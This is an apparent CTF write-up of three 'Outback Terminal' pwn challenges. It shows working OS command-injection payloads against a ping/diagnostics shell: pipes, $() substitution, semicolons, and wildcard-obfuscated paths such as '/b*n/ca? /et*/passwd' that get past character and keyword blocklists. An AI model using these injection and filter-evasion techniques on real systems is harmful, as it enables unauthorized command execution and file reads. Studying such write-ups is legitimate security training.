---
layout: post
title:  "Pwn Challenges"
date:   2026-11-24 01:30:00 -0400
author: uzi
tags: [CTF]
permalink: /outback-overflow-ctf-2026-pwn/
---
* TOC
{:toc}

## Outback Terminal I

**Category**: pwn

**Author**: digitalsurf

**Description**: OutbackCorp's IT team set up a remote management terminal so technicians can run basic network diagnostics without SSH access. It's supposed to be locked down to just a few safe commands.

Supposed to be.

Flag format: `OO{...}`

`nc infra.hscyber.org 4001`

I connect to the server:
```shell
nc infra.hscyber.org 4001  
  
╔══════════════════════════════════════════════════╗  
║         OutbackCorp Remote Management            ║  
║              Network Diagnostics                 ║  
╚══════════════════════════════════════════════════╝  
  
Welcome, technician. This terminal provides basic  
network diagnostic tools for OutbackCorp servers.  
  
Type 'help' for available commands. Type 'exit' to quit.  
  
outback-mgmt> help  
help  
  
Available commands:  
  ping <host>   - Ping a remote host  
  status        - Show server status  
  help          - Show this help message  
  exit          - Close the session  
  
outback-mgmt> ping 127.0.0.1  
ping 127.0.0.1  
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.  
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.076 ms  
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.051 ms  
  
--- 127.0.0.1 ping statistics ---  
2 packets transmitted, 2 received, 0% packet loss, time 1007ms  
rtt min/avg/max/mdev = 0.051/0.063/0.076/0.012 ms
```

I see they straight up run the ping command. I tried to add a basic command and found the flag:
```shell
outback-mgmt> ping 127.0.0.1 | id  
ping 127.0.0.1 | id  
uid=999(ctf) gid=999(ctf) groups=999(ctf)

outback-mgmt> ping 127.0.0.1 | ls ../  
ping 127.0.0.1 | ls ../  
app  
bin  
boot  
dev  
entrypoint.sh  
etc  
flag.txt  
home  
lib  
lib64  
media  
mnt  
opt  
proc  
root  
run  
sbin  
srv  
sys  
tmp  
usr  
var  
  
outback-mgmt> ping 127.0.0.1 | cat ../flag.txt  
ping 127.0.0.1 | cat ../flag.txt  
OO{n0_filt3r_n0_pr0bl3m}
```

`OO{n0_filt3r_n0_pr0bl3m}`

___

## Outback Terminal II

**Category**: pwn

**Author**: digitalsurf

**Description**: After the first incident, IT patched the management terminal. They added a blocklist that filters dangerous characters and common command names.

The patch notes say it's fixed. The security team isn't so sure.

Flag format: `OO{...}`

`nc infra.hscyber.org 4002`

Connecting to the server:
```shell
nc infra.hscyber.org 4002  
  
╔══════════════════════════════════════════════════╗  
║         OutbackCorp Remote Management            ║  
║           Network Diagnostics v2.0               ║  
║                                                  ║  
║  [!] Security patch applied - input validation   ║  
║      has been hardened per IT advisory #2847     ║  
╚══════════════════════════════════════════════════╝  
  
Welcome, technician. This terminal provides basic  
network diagnostic tools for OutbackCorp servers.  
  
Type 'help' for available commands. Type 'exit' to quit.  
  
outback-mgmt> help  
help  
  
Available commands:  
  ping <host>      - Ping a remote host  
  nslookup <host>  - DNS lookup  
  status           - Show server status  
  help             - Show this help message  
  exit             - Close the session
```

I found `|`, `&`, `;`, `cat`, and `flag` were blocked. I used `$()` syntax with a wildcard to get the flag:
```shell
outback-mgmt> ping 127.0.0.1 $(head ../fla*)  
ping 127.0.0.1 $(head ../fla*)  
  
ping: OO{bl0ckl1st_byp4ss_ez}
```

`OO{bl0ckl1st_byp4ss_ez}`

___

## Outback Terminal III

**Category**: pwn

**Author**: digitalsurf

**Description**: The IT team hired a pentester. The pentester found the injection. Now v3.0 blocks everything — semicolons, pipes, dollar signs, backticks, parentheses, brackets, even most common command names.

They called it "hardened." But someone on the dev team left something behind that didn't get the same treatment.

Flag format: `OO{...}`

`nc infra.hscyber.org 4003`

Connecting to the server:
```shell
nc infra.hscyber.org 4003  
  
╔══════════════════════════════════════════════════╗  
║         OutbackCorp Remote Management            ║  
║           Network Diagnostics v3.0               ║  
║                                                  ║  
║  [!] HARDENED BUILD - Full input sanitization    ║  
║      deployed after pentest findings #PT-0093    ║  
╚══════════════════════════════════════════════════╝  
  
Welcome, technician. This terminal provides basic  
network diagnostic tools for OutbackCorp servers.  
  
Type 'help' for available commands. Type 'exit' to quit.  
  
outback-mgmt> help  
help  
  
Available commands:  
  ping <host>        - Ping a remote host  
  nslookup <host>    - DNS lookup  
  traceroute <host>  - Trace route to host  
  status             - Show server status  
  help               - Show this help message  
  exit               - Close the session  
  
outback-mgmt>
```

Eventually I found a command which was not listed:
```shell
outback-mgmt> diagnose  
diagnose  
Usage: diagnose <target>
```

I was able to execute commands with it:
```shell
diagnose 127.0.0.1;id  
=== Diagnostic Results ===  
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.  
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.098 ms  
  
--- 127.0.0.1 ping statistics ---  
1 packets transmitted, 1 received, 0% packet loss, time 0ms  
rtt min/avg/max/mdev = 0.098/0.098/0.098/0.000 ms  
uid=999(ctf) gid=999(ctf) groups=999(ctf)  
  
=== End Report ===
```

Finally I got the flag with `/b*n/ca? /fla*` (I tested on `/etc/passwd`):
```shell
outback-mgmt> diagnose 127.0.0.1; /b*n/ca? /et*/passwd  
diagnose 127.0.0.1; /b*n/ca? /et*/passwd  
=== Diagnostic Results ===  
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.  
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.125 ms  
  
--- 127.0.0.1 ping statistics ---  
1 packets transmitted, 1 received, 0% packet loss, time 0ms  
rtt min/avg/max/mdev = 0.125/0.125/0.125/0.000 ms  
root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin  
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
ctf:x:999:999::/home/ctf:/usr/sbin/nologin  
  
=== End Report ===

outback-mgmt> diagnose 127.0.0.1; /b*n/ca? /fla*  
diagnose 127.0.0.1; /b*n/ca? /fla*  
=== Diagnostic Results ===  
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.  
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.034 ms  
  
--- 127.0.0.1 ping statistics ---  
1 packets transmitted, 1 received, 0% packet loss, time 0ms  
rtt min/avg/max/mdev = 0.034/0.034/0.034/0.000 ms  
OO{h1dd3n_d3bug_ftw}  
  
=== End Report ===
```

You could also use `/bin/more`:
```shell
outback-mgmt> diagnose 127.0.0.1; /b*n/m*re /f??g.t?t  
diagnose 127.0.0.1; /b*n/m*re /f??g.t?t  
=== Diagnostic Results ===  
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.  
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.061 ms  
  
--- 127.0.0.1 ping statistics ---  
1 packets transmitted, 1 received, 0% packet loss, time 0ms  
rtt min/avg/max/mdev = 0.061/0.061/0.061/0.000 ms  
OO{h1dd3n_d3bug_ftw}  
  
=== End Report ===
```

`OO{h1dd3n_d3bug_ftw}`
